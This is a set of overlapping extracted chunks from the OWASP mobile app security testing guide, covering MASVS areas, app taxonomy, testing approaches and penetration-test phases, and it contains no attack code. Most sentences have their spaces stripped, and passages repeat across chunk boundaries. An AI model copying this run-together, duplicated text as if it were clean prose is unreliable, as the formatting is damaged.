TheOWASPMobileApplicationSecurity TestingGuide(MASTG)mapstothesamebasicsetofsecurityrequirementsofferedbytheMASVSanddependingonthe contexttheycanbeusedindividuallyorcombinedtoachievedifferentobjectives. Forexample,theMASVSrequirementscanbeusedinanapp’splanningandarchitecturedesignstageswhilethechecklist andtestingguidemayserveasabaselineformanualsecuritytestingorasatemplateforautomatedsecuritytestsduring orafterdevelopment. Inthe“MobileAppSecurityTesting”chapterwe’lldescribehowyoucanapplythechecklistand MASTGtoamobileapppenetrationtest. Key Areas in Mobile Application Security Many mobile app penetration testers have a background in network and web app penetration testing, a quality that is valuable for mobile app testing. Almost every mobile app talks to a backend service, and those services are prone to the same types of attacks we are familiar with in web apps on desktop machines. Mobile apps differ in that there is a smallerattacksurfaceandthereforemoresecurityagainstinjectionandsimilarattacks. Instead,wemustprioritizedata protectiononthedeviceandthenetworktoincreasemobilesecurity. Let’sdiscussthekeyareasinmobileappsecurity. 25\\nData Storage and Privacy (MASVS-STORAGE) Theprotectionofsensitivedata,suchasusercredentialsandprivateinformation,iscrucialtomobilesecurity. Ifanapp usesoperatingsystemAPIssuchaslocalstorageorinter-processcommunication(IPC)improperly,theappmightexpose sensitivedatatootherappsrunningonthesamedevice. Itmayalsounintentionallyleakdatatocloudstorage,backups, orthekeyboardcache. Additionally,mobiledevicescanbelostorstolenmoreeasilycomparedtoothertypesofdevices, soit’smorelikelyanindividualcangainphysicalaccesstothedevice,makingiteasiertoretrievethedata. Whendevelopingmobileapps,wemusttakeextracarewhenstoringuserdata. Forexample,wecanuseappropriatekey storageAPIsandtakeadvantageofhardware-backedsecurityfeatureswhenavailable. FragmentationisaproblemwedealwithespeciallyonAndroiddevices. NoteveryAndroiddeviceoffershardware-backed securestorage, andmanydevicesarerunningoutdatedversionsofAndroid. Foranapptobesupportedontheseout- of-date devices, it would have to be created using an older version of Android’s API which may lack important security features. Formaximumsecurity,thebestchoiceistocreateappswiththecurrentAPIversioneventhoughthatexcludes someusers. Cryptography (MASVS-CRYPTO) Cryptography is an essential ingredient when it comes to protecting data stored on a mobile device. It is also an area wherethingscangohorriblywrong,especiallywhenstandardconventionsarenotfollowed. Itisessentialtoensurethat theapplicationusescryptographyaccordingtoindustrybestpractices,includingtheuseofprovencryptographiclibraries, aproperchoiceandconfigurationofcryptographicprimitivesaswellasasuitablerandomnumbergeneratorwherever randomnessisrequired. Authentication and Authorization (MASVS-AUTH) Inmostcases,sendinguserstologintoaremoteserviceisanintegralpartoftheoverallmobileapparchitecture. Even thoughmostoftheauthenticationandauthorizationlogichappensattheendpoint,therearealsosomeimplementation challengesonthemobileappside. Unlikewebapps,mobileappsoftenstorelong-timesessiontokensthatareunlocked withuser-to-deviceauthenticationfeaturessuchasfingerprintscanning. Whilethisallowsforaquickerloginandbetter userexperience(nobodylikestoentercomplexpasswords),italsointroducesadditionalcomplexityandroomforerror. Mobileapparchitecturesalsoincreasinglyincorporateauthorizationframeworks(suchasOAuth2)thatdelegateauthen- ticationtoaseparateserviceoroutsourcetheauthenticationprocesstoanauthenticationprovider. UsingOAuth2allows theclient-sideauthenticationlogictobeoutsourcedtootherappsonthesamedevice(e.g.thesystembrowser). Security testersmustknowtheadvantagesanddisadvantagesofdifferentpossibleauthorizationframeworksandarchitectures. Network Communication (MASVS-NETWORK) Mobiledevicesregularlyconnecttoavarietyofnetworks,includingpublicWi-Finetworkssharedwithother(potentially malicious) clients. This creates opportunities for a wide variety of network-based attacks ranging from simple to com- plicatedandoldtonew. It’scrucialtomaintaintheconfidentialityandintegrityofinformationexchangedbetweenthe mobileappandremoteserviceendpoints. Asabasicrequirement,mobileappsmustsetupasecure,encryptedchannel fornetworkcommunicationusingtheTLSprotocolwithappropriatesettings. Interaction with the Mobile Platform (MASVS-PLATFORM) Mobile operating system architectures differ from classical desktop architectures in important ways. For example, all mobileoperatingsystemsimplementapppermissionsystemsthatregulateaccesstospecificAPIs. Theyalsooffermore (Android) or less rich (iOS) inter-process communication (IPC) facilities that enable apps to exchange signals and data. Theseplatform-specificfeaturescomewiththeirownsetofpitfalls. Forexample,ifIPCAPIsaremisused,sensitivedata orfunctionalitymightbeunintentionallyexposedtootherappsrunningonthedevice. 26\\nCode Quality and Exploit Mitigation (MASVS-CODE) Traditionalinjectionandmemorymanagementissuesaren’toftenseeninmobileappsduetothesmallerattacksurface. MobileappsmostlyinteractwiththetrustedbackendserviceandtheUI,soevenifmanybufferoverflowvulnerabilities exist in the app, those vulnerabilities usually don’t open up any useful attack vectors. The same applies to browser exploitssuchascross-sitescripting(XSSallowsattackerstoinjectscriptsintowebpages)thatareveryprevalentinweb apps. However,therearealwaysexceptions. XSSistheoreticallypossibleonmobileinsomecases,butit’sveryrareto seeXSSissuesthatanindividualcanexploit. This protection from injection and memory management issues doesn’t mean that app developers can get away with writingsloppycode. Followingsecuritybestpracticesresultsinhardened(secure)releasebuildsthatareresilientagainst tampering. FreesecurityfeaturesofferedbycompilersandmobileSDKshelpincreasesecurityandmitigateattacks. Anti-Tampering and Anti-Reversing (MASVS-RESILIENCE) Therearethreethingsyoushouldneverbringupinpoliteconversations: religion,politics,andcodeobfuscation. Many security experts dismiss client-side protections outright. However, software protection controls are widely used in the mobileappworld,sosecuritytestersneedwaystodealwiththeseprotections. Webelievethere’sabenefittoclient-side protectionsiftheyareemployedwithaclearpurposeandrealisticexpectationsinmindandaren’tusedtoreplacesecurity controls. Navigating the OWASP MASTG The MASTG contains descriptions of all requirements specified in the MASVS. The MASTG contains the following main sections: 1. The General Testing Guide contains a mobile app security testing methodology and general vulnerability analy- sis techniques as they apply to mobile app",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 34
    }
  },
  {
    "text": "mobileappworld,sosecuritytestersneedwaystodealwiththeseprotections. Webelievethere’sabenefittoclient-side protectionsiftheyareemployedwithaclearpurposeandrealisticexpectationsinmindandaren’tusedtoreplacesecurity controls. Navigating the OWASP MASTG The MASTG contains descriptions of all requirements specified in the MASVS. The MASTG contains the following main sections: 1. The General Testing Guide contains a mobile app security testing methodology and general vulnerability analy- sis techniques as they apply to mobile app security. It also contains additional technical test cases that are OS- independent,suchasauthenticationandsessionmanagement,networkcommunications,andcryptography. 2. TheAndroidTestingGuidecoversmobilesecuritytestingfortheAndroidplatform,includingsecuritybasics,security testcases,reverseengineeringtechniquesandprevention,andtamperingtechniquesandprevention. 3. The iOS Testing Guide covers mobile security testing for the iOS platform, including an overview of the iOS OS, securitytesting,reverseengineeringtechniquesandprevention,andtamperingtechniquesandprevention. 27\\nMobile Application Taxonomy The term “mobile application” or “mobile app” refers to a self-contained computer program designed to execute on a mobile device. Today, the Android and iOS operating systems cumulatively comprisemore than 99% of the mobile OS marketshare. Additionally,mobileInternetusagehassurpasseddesktopusageforthefirsttimeinhistory,makingmobile browsingandappsthemostwidespreadkindofInternet-capableapps. Inthisguide,we’llusetheterm“app”asageneraltermforreferringtoanykindofapplicationrunningonpopular mobileOSes. Inabasicsense,appsaredesignedtoruneitherdirectlyontheplatformforwhichthey’redesigned,ontopofasmart device’smobilebrowser,orusingamixofthetwo. Throughoutthefollowingchapter,wewilldefinecharacteristicsthat qualifyanappforitsrespectiveplaceinmobileapptaxonomyaswellasdiscussdifferencesforeachvariation. Native App Mobileoperatingsystems,includingAndroidandiOS,comewithaSoftwareDevelopmentKit(SDK)fordevelopingapps specifictotheOS.Suchappsarereferredtoasnativetothesystemforwhichtheyhavebeendeveloped. Whendiscussing an app, the general assumption is that it is a native app implemented in a standard programming language for the respectiveoperatingsystem-Objective-CorSwiftforiOS,andJavaorKotlinforAndroid. Nativeappsinherentlyhavethecapabilitytoprovidethefastestperformancewiththehighestdegreeofreliability. They usuallyadheretoplatform-specificdesignprinciples(e.g.theAndroidDesignPrinciples),whichtendstoresultinamore consistentuserinterface(UI)comparedtohybridorwebapps. Duetotheircloseintegrationwiththeoperatingsystem, native apps can directly access almost every component of the device (camera, sensors, hardware-backed key stores, etc.). Some ambiguity exists when discussing native apps for Android as the platform provides two development kits - the AndroidSDKandtheAndroidNDK.TheSDK,whichisbasedontheJavaandKotlinprogramminglanguage,isthedefault fordevelopingapps. TheNDK(orNativeDevelopmentKit)isaC/C++developmentkitusedfordevelopingbinarylibraries thatcandirectlyaccesslowerlevelAPIs(suchasOpenGL).Theselibrariescanbeincludedinregularappsbuiltwiththe SDK.Therefore,wesaythatAndroidnativeapps(i.e.builtwiththeSDK)mayhavenativecodebuiltwiththeNDK. Themostobviousdownsideofnativeappsisthattheytargetonlyonespecificplatform. Tobuildthesameappforboth AndroidandiOS,oneneedstomaintaintwoindependentcodebases,orintroduceoftencomplexdevelopmenttoolsto portasinglecodebasetotwoplatforms. Thefollowingframeworksareanexampleofthelatterandallowyoutocompile asinglecodebaseforbothAndroidandiOS. • Xamarin • GoogleFlutter • ReactNative AppsdevelopedusingtheseframeworksinternallyusetheAPIsnativetothesystemandofferperformanceequivalent tonativeapps. Also,theseappscanmakeuseofalldevicecapabilities,includingtheGPS,accelerometer,camera,the notificationsystem,etc. Sincethefinaloutputisverysimilartopreviouslydiscussednativeapps,appsdevelopedusing theseframeworkscanalsobeconsideredasnativeapps. Web App Mobilewebapps(orsimply,webapps)arewebsitesdesignedtolookandfeellikeanativeapp. Theseappsrunontopof adevice’sbrowserandareusuallydevelopedinHTML5,muchlikeamodernwebpage. Launchericonsmaybecreated toparallelthesamefeelofaccessinganativeapp;however,theseiconsareessentiallythesameasabrowserbookmark, simplyopeningthedefaultwebbrowsertoloadthereferencedwebpage. Webappshavelimitedintegrationwiththegeneralcomponentsofthedeviceastheyrunwithintheconfinesofabrowser (i.e.theyare“sandboxed”)andusuallylackinperformancecomparedtonativeapps. Sinceawebapptypicallytargets multiple platforms, their UIs do not follow some of the design principles of a specific platform. The biggest advantage is reduced development and maintenance costs associated with a single code base as well as enabling developers to 28\\ndistributeupdateswithoutengagingtheplatform-specificappstores. Forexample,achangetotheHTMLfileforaweb app can serve as viable, cross-platform update whereas an update to a store-based app requires considerably more effort. Hybrid App Hybridappsattempttofillthegapbetweennativeandwebapps. Ahybridappexecuteslikeanativeapp,butamajority oftheprocessesrelyonwebtechnologies,meaningaportionoftheapprunsinanembeddedwebbrowser(commonly called“WebView”). Assuch,hybridappsinheritbothprosandconsofnativeandwebapps. A web-to-native abstraction layer enables access to device capabilities for hybrid apps not accessible to a pure web app. Dependingontheframeworkusedfordevelopment,onecodebasecanresultinmultipleappsthattargetdifferent platforms,withaUIcloselyresemblingthatoftheoriginalplatformforwhichtheappwasdeveloped. Followingisanon-exhaustivelistofmorepopularframeworksfordevelopinghybridapps: • ApacheCordova • Framework7 • Ionic • jQueryMobile • NativeScript • OnsenUI • SenchaTouch Progressive Web App ProgressiveWebApps(PWA)loadlikeregularwebpages, butdifferfromusualwebappsinseveralways. Forexample it’spossibletoworkofflineandaccesstomobiledevicehardwareispossible,thattraditionallyisonlyavailabletonative mobileapps. PWAs combine different open standards of the web offered by modern browsers to provide benefits of a rich mobile experience. A Web App Manifest, which is a simple JSON file, can be used to configure the behavior of the app after “installation”. PWAsaresupportedbyAndroidandiOS,butnotallhardwarefeaturesareyetavailable. ForexamplePushNotifications, FaceIDoniPhoneXorARKitforaugmentedrealityisnotavailableyetoniOS.AnoverviewofPWAandsupportedfeatures oneachplatformcanbefoundinaMediumarticlefromMaximilianoFirtman. What’s Covered in the Mobile Testing Guide Throughoutthisguide,wewillfocusonappsforAndroidandiOSrunningonsmartphones. Theseplatformsarecurrently dominating the market and also run on other device classes including tablets, smartwatches, smart TVs, automotive infotainmentunits,andotherembeddedsystems. Eveniftheseadditionaldeviceclassesareoutofscope,youcanstill applymostoftheknowledgeandtestingtechniquesdescribedinthisguidewithsomedeviancedependingonthetarget device. Given the vast amount of mobile app frameworks available it would be impossible to cover all of them exhaustively. Therefore, we focus on native apps on each operating system. However, the same techniques are also useful when dealingwithweborhybridapps(ultimately,nomattertheframework,everyappisbasedonnativecomponents). 29\\nMobile Application Security Testing In the following sections we’ll provide a brief overview of general security testing principles and key terminology. The conceptsintroducedarelargelyidenticaltothosefoundinothertypesofpenetrationtesting,soifyouareanexperienced testeryoumaybefamiliarwithsomeofthecontent. Throughout the guide, we use “mobile app security testing” as a catchall phrase to refer to the evaluation of mobile appsecurityviastaticanddynamicanalysis. Termssuchas“mobileapppenetrationtesting”and“mobileappsecurity",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 35
    }
  },
  {
    "text": "also useful when dealingwithweborhybridapps(ultimately,nomattertheframework,everyappisbasedonnativecomponents). 29\\nMobile Application Security Testing In the following sections we’ll provide a brief overview of general security testing principles and key terminology. The conceptsintroducedarelargelyidenticaltothosefoundinothertypesofpenetrationtesting,soifyouareanexperienced testeryoumaybefamiliarwithsomeofthecontent. Throughout the guide, we use “mobile app security testing” as a catchall phrase to refer to the evaluation of mobile appsecurityviastaticanddynamicanalysis. Termssuchas“mobileapppenetrationtesting”and“mobileappsecurity review” are used somewhat inconsistently in the security industry, but these terms refer to roughly the same thing. A mobileappsecuritytestisusuallypartofalargersecurityassessmentorpenetrationtestthatencompassestheclient- serverarchitectureandserver-sideAPIsusedbythemobileapp. Inthisguide,wecovermobileappsecuritytestingintwocontexts. Thefirstisthe“classical”securitytestcompletednear theendofthedevelopmentlifecycle. Inthiscontext,thetesteraccessesanearlyfinishedorproduction-readyversion oftheapp,identifiessecurityissues,andwritesa(usuallydevastating)report. Theothercontextischaracterizedbythe implementation of requirements and the automation of security tests from the beginning of the software development lifecycleonwards. Thesamebasicrequirementsandtestcasesapplytobothcontexts,butthehigh-levelmethodand thelevelofclientinteractiondiffer. Principles of Testing White-box Testing versus Black-box Testing Let’sstartbydefiningtheconcepts: • Black-box testing is conducted without the tester’s having any information about the app being tested. This processissometimescalled“zero-knowledgetesting”. Themainpurposeofthistestisallowingthetestertobehave likearealattackerinthesenseofexploringpossibleusesforpubliclyavailableanddiscoverableinformation. • White-box testing (sometimes called “full knowledge testing”) is the total opposite of black-box testing in the sensethatthetesterhasfullknowledgeoftheapp. Theknowledgemayencompasssourcecode,documentation, anddiagrams. Thisapproachallowsmuchfastertestingthanblack-boxtestingduetoitstransparencyandwith theadditionalknowledgegainedatestercanbuildmuchmoresophisticatedandgranulartestcases. • Gray-box testing is all testing that falls in between the two aforementioned testing types: some informationis providedtothetester(usuallycredentialsonly),andotherinformationisintendedtobediscovered. Thistypeof testing is an interesting compromise in the number of test cases, the cost, the speed, and the scope of testing. Gray-boxtestingisthemostcommonkindoftestinginthesecurityindustry. Westronglyadvisethatyourequestthesourcecodesothatyoucanusethetestingtimeasefficientlyaspossible. The tester’scodeaccessobviouslydoesn’tsimulateanexternalattack,butitsimplifiestheidentificationofvulnerabilitiesby allowingthetestertoverifyeveryidentifiedanomalyorsuspiciousbehavioratthecodelevel. Awhite-boxtestistheway togoiftheapphasn’tbeentestedbefore. EventhoughdecompilingonAndroidisstraightforward,thesourcecodemaybeobfuscated,andde-obfuscatingwillbe time-consuming. Timeconstraintsarethereforeanotherreasonforthetestertohaveaccesstothesourcecode. Vulnerability Analysis Vulnerability analysis is usually the process of looking for vulnerabilities in an app. Although this may be done manu- ally,automatedscannersareusuallyusedtoidentifythemainvulnerabilities. Staticanddynamicanalysisaretypesof vulnerabilityanalysis. Static versus Dynamic Analysis StaticApplicationSecurityTesting(SAST)involvesexamininganapp’scomponentswithoutexecutingthem,byanalyzing thesourcecodeeithermanuallyorautomatically. OWASPprovidesinformationaboutStaticCodeAnalysisthatmayhelp youunderstandtechniques,strengths,weaknesses,andlimitations. 30\\nDynamic Application Security Testing (DAST) involves examining the app during runtime. This type of analysis can be manual or automatic. It usually doesn’t provide the information that static analysis provides, but it is a good way to detectinterestingelements(assets,features,entrypoints,etc.) fromauser’spointofview. Nowthatwehavedefinedstaticanddynamicanalysis,let’sdivedeeper. Static Analysis Duringstaticanalysis,themobileapp’ssourcecodeisreviewedtoensureappropriateimplementationofsecuritycontrols. Inmostcases,ahybridautomatic/manualapproachisused. Automaticscanscatchthelow-hangingfruit,andthehuman testercanexplorethecodebasewithspecificusagecontextsinmind. Manual Code Review A tester performs manual code review by manually analyzing the mobile app’s source code for security vulnerabilities. Methods range from a basic keyword search via the ‘grep’ command to a line-by-line examination of the source code. IDEs(IntegratedDevelopmentEnvironments)oftenprovidebasiccodereviewfunctionsandcanbeextendedwithvarious tools. A common approach to manual code analysis entails identifying key security vulnerability indicators by searching for certain APIs and keywords, such as database-related method calls like “executeStatement” or “executeQuery”. Code containingthesestringsisagoodstartingpointformanualanalysis. In contrast to automatic code analysis, manual code review is very good for identifying vulnerabilities in the business logic, standards violations, and design flaws, especially when the code is technically secure but logically flawed. Such scenariosareunlikelytobedetectedbyanyautomaticcodeanalysistool. Amanualcodereviewrequiresanexpertcodereviewerwhoisproficientinboththelanguageandtheframeworksused forthemobileapp. Fullcodereviewcanbeaslow, tedious, time-consumingprocessforthereviewer, especiallygiven largecodebaseswithmanydependencies. Automated Source Code Analysis AutomatedanalysistoolscanbeusedtospeedupthereviewprocessofStaticApplicationSecurityTesting(SAST).They checkthesourcecodeforcompliancewithapredefinedsetofrulesorindustrybestpractices, thentypicallydisplaya listoffindingsorwarningsandflagsforalldetectedviolations. Somestaticanalysistoolsrunagainstthecompiledapp only, somemustbefedtheoriginalsourcecode, andsomerunaslive-analysispluginsintheIntegratedDevelopment Environment(IDE). Althoughsomestaticcodeanalysistoolsincorporatealotofinformationabouttherulesandsemanticsrequiredtoanalyze mobileapps,theymayproducemanyfalsepositives,particularlyiftheyarenotconfiguredforthetargetenvironment. A securityprofessionalmustthereforealwaysreviewtheresults. Thechapter“TestingTools”includesalistofstaticanalysistools,whichcanbefoundattheendofthisbook. Dynamic Analysis The focus of DAST is the testing and evaluation of apps via their real-time execution. The main objective of dynamic analysisisfindingsecurityvulnerabilitiesorweakspotsinaprogramwhileitisrunning. Dynamicanalysisisconducted bothatthemobileplatformlayerandagainstthebackendservicesandAPIs,wherethemobileapp’srequestandresponse patternscanbeanalyzed. Dynamic analysis is usually used to check for security mechanisms that provide sufficient protection against the most prevalenttypesofattack,suchasdisclosureofdataintransit,authenticationandauthorizationissues,andservercon- figurationerrors. 31\\nAvoiding False Positives Automated Scanning Tools Automatedtestingtools’lackofsensitivitytoappcontextisachallenge. Thesetoolsmayidentifyapotentialissuethat’s irrelevant. Suchresultsarecalled“falsepositives”. Forexample, securitytesterscommonlyreportvulnerabilitiesthatareexploitableinawebbrowserbutaren’trelevant to the mobile app. This false positive occurs because automated tools used to scan the backend service are based on regular browser-based web apps. Issues such as CSRF (Cross-site Request Forgery) and Cross-Site Scripting (XSS) are",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 36
    }
  },
  {
    "text": "prevalenttypesofattack,suchasdisclosureofdataintransit,authenticationandauthorizationissues,andservercon- figurationerrors. 31\\nAvoiding False Positives Automated Scanning Tools Automatedtestingtools’lackofsensitivitytoappcontextisachallenge. Thesetoolsmayidentifyapotentialissuethat’s irrelevant. Suchresultsarecalled“falsepositives”. Forexample, securitytesterscommonlyreportvulnerabilitiesthatareexploitableinawebbrowserbutaren’trelevant to the mobile app. This false positive occurs because automated tools used to scan the backend service are based on regular browser-based web apps. Issues such as CSRF (Cross-site Request Forgery) and Cross-Site Scripting (XSS) are reportedaccordingly. Let’stakeCSRFasanexample. AsuccessfulCSRFattackrequiresthefollowing: • Theabilitytoenticethelogged-inusertoopenamaliciouslinkinthewebbrowserusedtoaccessthevulnerable site. • Theclient(browser)mustautomaticallyaddthesessioncookieorotherauthenticationtokentotherequest. Mobile apps don’t fulfill these requirements: even if WebViews and cookie-based session management are used, any maliciouslinktheuserclicksopensinthedefaultbrowser,whichhasaseparatecookiestore. Stored Cross-Site Scripting (XSS) can be an issue if the app includes WebViews, and it may even lead to command executioniftheappexportsJavaScriptinterfaces. However,reflectedCross-SiteScriptingisrarelyanissueforthereason mentionedabove(eventhoughwhethertheyshouldexistatallisarguable,escapingoutputissimplyabestpractice). In any case, consider exploit scenarios when you perform the risk assessment; don’t blindly trust your scanning tool’soutput. Penetration Testing (a.k.a. Pentesting) Theclassicapproachinvolvesall-aroundsecuritytestingoftheapp’sfinalornear-finalbuild,e.g.,thebuildthat’savailable attheendofthedevelopmentprocess. Fortestingattheendofthedevelopmentprocess, werecommendtheMobile AppSecurityVerificationStandard(MASVS)andtheassociatedchecklistasbaselinefortesting. Atypicalsecuritytestis structuredasfollows: • Preparation-definingthescopeofsecuritytesting,includingidentifyingapplicablesecuritycontrols,theorgani- zation’stestinggoals,andsensitivedata. Moregenerally,preparationincludesallsynchronizationwiththeclient aswellaslegallyprotectingthetester(whoisoftenathirdparty). Remember,attackingasystemwithoutwritten authorizationisillegalinmanypartsoftheworld! • IntelligenceGathering-analyzingtheenvironmentalandarchitecturalcontextoftheapptogainageneral contextualunderstanding. • MappingtheApplication-basedoninformationfromthepreviousphases;maybecomplementedbyautomated scanningandmanuallyexploringtheapp. Mappingprovidesathoroughunderstandingoftheapp,itsentrypoints, the data it holds, and the main potential vulnerabilities. These vulnerabilities can then be ranked according to thedamagetheirexploitationwouldcausesothatthesecuritytestercanprioritizethem. Thisphaseincludesthe creationoftestcasesthatmaybeusedduringtestexecution. • Exploitation-inthisphase,thesecuritytestertriestopenetratetheappbyexploitingthevulnerabilitiesidenti- fiedduringthepreviousphase. Thisphaseisnecessaryfordeterminingwhethervulnerabilitiesarerealandtrue positives. • Reporting - in this phase, which is essential to the client, the security tester reports the vulnerabilities. This includes the exploitation process in detail, classifies the type of vulnerability, documents the risk if an attacker wouldbeabletocompromisethetargetandoutlineswhichdatathetesterhasbeenabletoaccessillegitimately. Preparation Thesecuritylevelatwhichtheappwillbetestedmustbedecidedbeforetesting. Thesecurityrequirementsshouldbe decidedatthebeginningoftheproject. Differentorganizationshavedifferentsecurityneedsandresourcesavailablefor investingintestactivities. AlthoughthecontrolsinMASVSLevel1(L1)areapplicabletoallmobileapps,walkingthrough theentirechecklistofL1andLevel2(L2)MASVScontrolswithtechnicalandbusinessstakeholdersisagoodwaytodecide onaleveloftestcoverage. 32\\nOrganizations may have different regulatory and legal obligations in certain territories. Even if an app doesn’t handle sensitivedata,someL2requirementsmayberelevant(becauseofindustryregulationsorlocallaws). Forexample,two- factorauthentication(2FA)maybeobligatoryforafinancialappandenforcedbyacountry’scentralbankand/orfinancial regulatoryauthorities. Securitygoals/controlsdefinedearlierinthedevelopmentprocessmayalsobereviewedduringthediscussionwithstake- holders. SomecontrolsmayconformtoMASVScontrols,butothersmaybespecifictotheorganizationorapp. Allinvolvedpartiesmustagreeonthedecisionsandthescopeinthechecklistbecausethesewilldefinethebaselinefor allsecuritytesting. Coordinating with the Client Settingupaworkingtestenvironmentcanbeachallengingtask. Forexample,restrictionsontheenterprisewirelessac- cesspointsandnetworksmayimpededynamicanalysisperformedatclientpremises. Companypoliciesmayprohibitthe useofrootedphonesor(hardwareandsoftware)networktestingtoolswithinenterprisenetworks. Appsthatimplement rootdetectionandotherreverseengineeringcountermeasuresmaysignificantlyincreasetheworkrequiredforfurther analysis. Security testing involves many invasive tasks, including monitoring and manipulating the mobile app’s network traffic, inspectingtheappdatafiles,andinstrumentingAPIcalls. Securitycontrols,suchascertificatepinningandrootdetection, mayimpedethesetasksanddramaticallyslowtestingdown. Toovercometheseobstacles,youmaywanttorequesttwooftheapp’sbuildvariantsfromthedevelopmentteam. One variantshouldbeareleasebuildsothatyoucandeterminewhethertheimplementedcontrolsareworkingproperlyand can’t be bypassed easily. The second variant should be a debug build for which certain security controls have been deactivated. Testingtwodifferentbuildsisthemostefficientwaytocoveralltestcases. Dependingonthescopeoftheengagement,thisapproachmaynotbepossible. Requestingbothproductionanddebug buildsforawhite-boxtestwillhelpyoucompletealltestcasesandclearlystatetheapp’ssecuritymaturity. Theclientmay preferthatblack-boxtestsbefocusedontheproductionappandtheevaluationofitssecuritycontrols’effectiveness. Thescopeofbothtypesoftestingshouldbediscussedduringthepreparationphase. Forexample,whetherthesecurity controlsshouldbeadjustedshouldbedecidedbeforetesting. Additionaltopicsarediscussedbelow. Identifying Sensitive Data Classifications of sensitive information differ by industry and country. In addition, organizations may take a restrictive viewofsensitivedata,andtheymayhaveadataclassificationpolicythatclearlydefinessensitiveinformation. Therearethreegeneralstatesfromwhichdatamaybeaccessible: • Atrest-thedataissittinginafileordatastore • Inuse-anapphasloadedthedataintoitsaddressspace • In transit-datahasbeenexchangedbetweenmobileappandendpointorconsumingprocessesonthedevice, e.g.,duringIPC(Inter-ProcessCommunication) The degree of scrutiny that’s appropriate for each state may depend on the data’s importance and likelihood of being accessed. Forexample,dataheldinappmemorymaybemorevulnerablethandataonwebserverstoaccessviacore dumpsbecauseattackersaremorelikelytogainphysicalaccesstomobiledevicesthantowebservers. Whennodataclassificationpolicyisavailable,usethefollowinglistofinformationthat’sgenerallyconsideredsensitive: • userauthenticationinformation(credentials,PINs,etc.) • PersonallyIdentifiableInformation(PII)thatcanbeabusedforidentitytheft: socialsecuritynumbers,creditcard numbers,bankaccountnumbers,healthinformation • deviceidentifiersthatmayidentifyaperson • highlysensitivedatawhosecompromisewouldleadtoreputationalharmand/orfinancialcosts • anydatawhoseprotectionisalegalobligation • anytechnicaldatageneratedbytheapp(oritsrelatedsystems)andusedtoprotectotherdataorthesystemitself (e.g.,encryptionkeys) Adefinitionof“sensitivedata”mustbedecidedbeforetestingbeginsbecausedetectingsensitivedataleakagewithout adefinitionmaybeimpossible. 33\\nIntelligence Gathering Intelligencegatheringinvolvesthecollectionofinformationabouttheapp’sarchitecture,thebusinessusecasestheapp serves,andthecontextinwhichtheappoperates. Suchinformationmaybeclassifiedas“environmental”or“architec- tural”. Environmental Information Environmentalinformationincludes: • The organization’s goals for the app. Functionality shapes users’ interaction with the app and may make some surfacesmorelikelythanotherstobetargetedbyattackers. • Therelevantindustry. Differentindustriesmayhavedifferentriskprofiles. • Stakeholdersandinvestors;understandingwhoisinterestedinandresponsiblefortheapp. • Internal processes, workflows, and organizational structures. Organization-specific internal processes and work- flowsmaycreateopportunitiesforbusinesslogicvulnerabilities. Architectural Information Architecturalinformationincludes: • Themobileapp: Howtheappaccessesdataandmanagesitin-process,howitcommunicateswithotherresources andmanagesusersessions,andwhetheritdetectsitselfrunningonjailbrokenorrootedphonesandreactstothese situations. • TheOperatingSystem: TheoperatingsystemsandOSversionstheapprunson(includingAndroidoriOSversion restrictions),whethertheappisexpectedtorunondevicesthathaveMobileDeviceManagement(MDM)controls, andrelevantOSvulnerabilities. • Network: Usageofsecuretransportprotocols(e.g.,TLS),usageofstrongkeysandcryptographicalgorithms(e.g., SHA-2)tosecurenetworktrafficencryption,usageofcertificatepinningtoverifytheendpoint,etc. • Remote Services: Theremoteservicestheappconsumesandwhethertheirbeingcompromisedcouldcompro- misetheclient. Mapping the Application Oncethesecuritytesterhasinformationabouttheappanditscontext,thenextstepismappingtheapp’sstructureand content,e.g.,identifyingitsentrypoints,features,anddata. Whenpenetrationtestingisperformedinawhite-boxorgrey-boxparadigm,anydocumentsfromtheinterioroftheproject (architecturediagrams,functionalspecifications,code,etc.) maygreatlyfacilitatetheprocess. Ifsourcecodeisavailable, theuseofSASTtoolscanrevealvaluableinformationaboutvulnerabilities(e.g.,SQLInjection). DASTtoolsmaysupport black-boxtestingandautomaticallyscantheapp: whereasatesterwillneedhoursordays,ascannermayperformthe same task in a few minutes. However, it’s important to remember that automatic tools have limitations and will only find what they have been programmed to find. Therefore, human analysis may be necessary to augment results from automatictools(intuitionisoftenkeytosecuritytesting). Threat Modeling is an important artifact: documents from the workshop usually",
    "metadata": {
      "doc_id": "OWASP_MASTG",
      "chunk_id": 37
    }
  },
  {
    "text": "whereasatesterwillneedhoursordays,ascannermayperformthe same task in a few minutes. However, it’s important to remember that automatic tools have limitations and will only find what they have been programmed to find. Therefore, human analysis may be necessary to augment results from automatictools(intuitionisoftenkeytosecuritytesting). Threat Modeling is an important artifact: documents from the workshop usually greatly support the identification of muchoftheinformationasecuritytesterneeds(entrypoints,assets,vulnerabilities,severity,etc.). Testersarestrongly advisedtodiscusstheavailabilityofsuchdocumentswiththeclient. Threatmodelingshouldbeakeypartofthesoftware developmentlifecycle. Itusuallyoccursintheearlyphasesofaproject. ThethreatmodelingguidelinesdefinedinOWASParegenerallyapplicabletomobileapps. Exploitation Unfortunately, time or financial constraints limit many pentests to application mapping via automated scanners (for vulnerability analysis, for example). Although vulnerabilities identified during the previous phase may be interesting, theirrelevancemustbeconfirmedwithrespecttofiveaxes: • Damagepotential-thedamagethatcanresultfromexploitingthevulnerability • Reproducibility-easeofreproducingtheattack • Exploitability-easeofexecutingtheattack 34\\n• Affectedusers-thenumberofusersaffectedbytheattack • Discoverability-easeofdiscoveringthevulnerability Againstallodds,somevulnerabilitiesmaynotbeexploitableandmayleadtominorcompromises,ifany. Othervulnera- bilitiesmayseemharmlessatfirstsight,yetbedeterminedverydangerousunderrealistictestconditions. Testerswho carefullygothroughtheexploitationphasesupportpentestingbycharacterizingvulnerabilitiesandtheireffects. Reporting The security tester’s findings will be valuable to the client only if they are clearly documented. A good pentest report shouldincludeinformationsuchas,butnotlimitedto,thefollowing: • anexecutivesummary • adescriptionofthescopeandcontext(e.g.,targetedsystems) • methodsused • sourcesofinformation(eitherprovidedbytheclientordiscoveredduringthepentest) • prioritizedfindings(e.g.,vulnerabilitiesthathavebeenstructuredbyDREADclassification) • detailedfindings • recommendationsforfixingeachdefect ManypentestreporttemplatesareavailableontheInternet: Googleisyourfriend! Security Testing and the SDLC Althoughtheprinciplesofsecuritytestinghaven’tfundamentallychangedinrecenthistory,softwaredevelopmenttech- niqueshavechangeddramatically. 